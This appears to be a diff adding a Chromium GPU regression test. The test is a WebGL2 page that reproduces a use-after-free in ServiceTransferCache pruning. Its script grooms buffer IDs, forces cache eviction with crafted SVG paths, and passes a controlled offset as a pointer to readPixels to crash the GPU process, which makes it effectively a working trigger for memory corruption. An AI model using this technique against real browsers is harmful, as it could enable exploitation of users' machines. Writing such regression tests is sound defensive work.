@@ -1,0 +1,179 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>WebGL2 ServiceTransferCache Prune Test</title>
+<body style="margin:0;background:#fff">
+<div id="b" style="position:absolute;left:0;top:calc(100vh + 4px);width:128px;height:128px;overflow:hidden;will-change:transform"></div>
+<script>
+// Regression test for ServiceTransferCache::PruneOldEntries() deleting Skia
+// GPU resources without first making SharedContextState current.
+function send(result, message) {
+  if (message) {
+    console.log(message);
+  }
+  if (window.domAutomationController) {
+    window.domAutomationController.send(result);
+  } else {
+    console.log(result);
+  }
+}
+
+(async () => {
+  const OFFSET = 0x41414140;
+  const ZEROS = 2270;
+  const PATHS = Math.ceil(4 * 2 ** 20 / (9 * ZEROS + 62)) + 4;
+  const NAMES = 640;
+  const sleep = ms => new Promise(r => setTimeout(r, ms));
+  const frame = () => new Promise(r => requestAnimationFrame(r));
+
+  // 1. Create a WebGL2 context on an unattached canvas with a pool of small
+  //    buffers. ANGLE numbers a context's buffers 1, 2, 3, ...; Skia's vertex
+  //    buffers in the GPU process's shared context also carry low IDs.
+  const canvas = document.createElement('canvas');
+  canvas.addEventListener('webglcontextlost', () => {
+    send('FAILURE', 'WebGL2 context lost');
+  });
+  const gl = canvas.getContext('webgl2', {antialias: false});
+  if (!gl) {
+    send('LOADED');
+    send('FAILURE', 'Failed to create WebGL2 context');
+    return;
+  }
+  send('LOADED');
+
+  const pool = [];
+  for (let i = 0; i < NAMES; i++) {
+    const b = gl.createBuffer();
+    gl.bindBuffer(gl.ARRAY_BUFFER, b);
+    gl.bufferData(gl.ARRAY_BUFFER, 16, gl.STATIC_DRAW);
+    pool.push(b);
+  }
+  gl.bindBuffer(gl.ARRAY_BUFFER, null);
+
+  // 2. Concave polygons of 8 x 8 px without antialiasing. Skia keeps a static
+  //    vertex buffer for each such path. 2270 zero-length lines in its path
+  //    data make each path ~20 KB in the raster client's paint cache. That
+  //    cache holds 4 MiB, and PATHS slightly exceeds that capacity. At the end
+  //    of every raster pass the client evicts some paths, the GPU process
+  //    deletes them from ServicePaintCache, and each deleted path leaves an
+  //    invalidation message in Skia's inbox to release its vertex buffer on
+  //    Skia's next resource cache maintenance. Box b is a compositor layer of
+  //    its own, 4 px below the viewport: rastered, not shown.
+  const below = document.getElementById('b');
+  const pad = 'l0 0'.repeat(ZEROS);
+  let svg = '<svg xmlns="http://www.w3.org/2000/svg" width="128" height="128" viewBox="0 0 1600 1600" style="position:absolute;left:0;top:0">';
+  for (let j = 0; j < PATHS; j++) {
+    svg += '<path shape-rendering="crispEdges" fill="#149" d="M0 0' + pad + 'L100 0L100 100L50 ' + (1 + j * .4) + 'L0 100Z"/>';
+  }
+
+  // 3. Small images, placed into box b briefly and hidden again, become
+  //    entries in the GPU process's ServiceTransferCache. Its 30 s timer
+  //    prunes entries that have not been used for 25 s. Erasing an image entry
+  //    triggers Skia resource cache maintenance, which drains the inbox from
+  //    step 2.
+  const keep = [];
+  let images = 0;
+  async function feed() {
+    for (let n = 0; n < 2; n++) {
+      const c = new OffscreenCanvas(128, 128);
+      const x = c.getContext('2d');
+      const i = images++;
+      x.fillStyle = 'rgb(' + i * 13 % 256 + ',' + (255 - i * 7 % 256) + ',40)';
+      x.fillRect(0, 0, 128, 128);
+      x.fillStyle = '#123';
+      x.fillRect(i % 90, i * 5 % 90, 30, 20);
+      const im = new Image();
+      im.decoding = 'sync';
+      im.src = URL.createObjectURL(await c.convertToBlob({type: 'image/png'}));
+      await im.decode();
+      im.style.cssText = 'position:absolute;left:0;top:0';
+      keep.push(im);
+      below.appendChild(im);
+      await frame();
+      await frame();
+      await sleep(20);
+      im.style.visibility = 'hidden';
+    }
+  }
+  await feed();
+
+  // 4. Wait 1.5 seconds without page raster work. While the shared context is
+  //    in use, GrCacheController's 1-second delayed cleanup task drains Skia's
+  //    inbox on the shared context. Waiting >1 s allows it to go idle before
+  //    starting the SVG raster loop.
+  await sleep(1500);
+  below.insertAdjacentHTML('afterbegin', svg + '</svg>');
+  const last = below.querySelector('path:last-child');
+
+  // 5. In every animation frame the last path gets a new color, so the layer's
+  //    tile is re-rastered. look() queries the GPU process whether buffers in
+  //    the pool still exist (64 right after the frame's commit, and 16 every
+  //    4 ms), which also makes the WebGL2 context current in the GPU process.
+  let turns = 0;
+  let at = 0;
+  let done = false;
+  function look(n) {
+    for (; n-- && !done; at = (at + 1) % NAMES) {
+      if (!gl.isBuffer(pool[at])) {
+        go();
+      }
+    }
+  }
+  function turn() {
+    if (done) return;
+    last.setAttribute('fill', 'rgb(20,' + (++turns % 200) + ',91)');
+    setTimeout(look, 0, 64);
+    requestAnimationFrame(turn);
+  }
+  turn();
+  const lookInterval = setInterval(look, 4, 16);
+
+  // 6. If a buffer in the pool was deleted while this WebGL2 context was
+  //    current because ServiceTransferCache::PruneOldEntries() did not make
+  //    SharedContextState current first, ANGLE reuses the freed GL buffer ID
+  //    for the next new buffer (twin), while the command decoder still maps a
+  //    pool object to that ID. Deleting the pool therefore deletes twin in
+  //    ANGLE and unbinds it from PIXEL_PACK_BUFFER, while the decoder retains
+  //    its record of the binding.
+  function go() {
+    done = true;
+    clearInterval(lookInterval);
+    const twin = gl.createBuffer();
+    gl.bindBuffer(gl.PIXEL_PACK_BUFFER, twin);
+    pool.forEach(b => gl.deleteBuffer(b));
+    if (gl.isBuffer(twin)) {
+      send('FAILURE', 'WebGL2 buffer was unexpectedly deleted');
+      return;
+    }
+    gl.clearColor(0x41 / 255, 0x42 / 255, 0x43 / 255, 0x44 / 255);
+    gl.clear(gl.COLOR_BUFFER_BIT);
+    // bufferData allocates nothing (ANGLE refuses the call), but raises the
+    // buffer size recorded by the command decoder against which OFFSET is
+    // validated. readPixels then passes OFFSET to ANGLE, which (having no
+    // PIXEL_PACK_BUFFER bound) treats OFFSET as a client memory pointer and
+    // crashes the GPU process.
+    gl.bufferData(gl.PIXEL_PACK_BUFFER, 0x7fe00000, gl.STATIC_DRAW);
+    gl.readPixels(0, 0, 8, 8, gl.RGBA, gl.UNSIGNED_BYTE, OFFSET);
+    gl.finish();
+    send('FAILURE', 'WebGL2 buffer was unexpectedly deleted');
+  }
+
+  // Wait past the 30-second ServiceTransferCache prune interval. If no buffers
+  // were corrupted and the GPU process did not crash, conclude with success.
+  await sleep(30000);
+  if (!done) {
+    done = true;
+    clearInterval(lookInterval);
+    for (let i = 0; i < NAMES; i++) {
+      if (!gl.isBuffer(pool[i])) {
+        send('FAILURE', 'WebGL2 buffer was unexpectedly deleted');
+        return;
+      }
+    }
+    if (gl.isContextLost()) {
+      send('FAILURE', 'WebGL2 context lost');
+      return;
+    }
+    send('SUCCESS');
+  }
+})();
+</script>
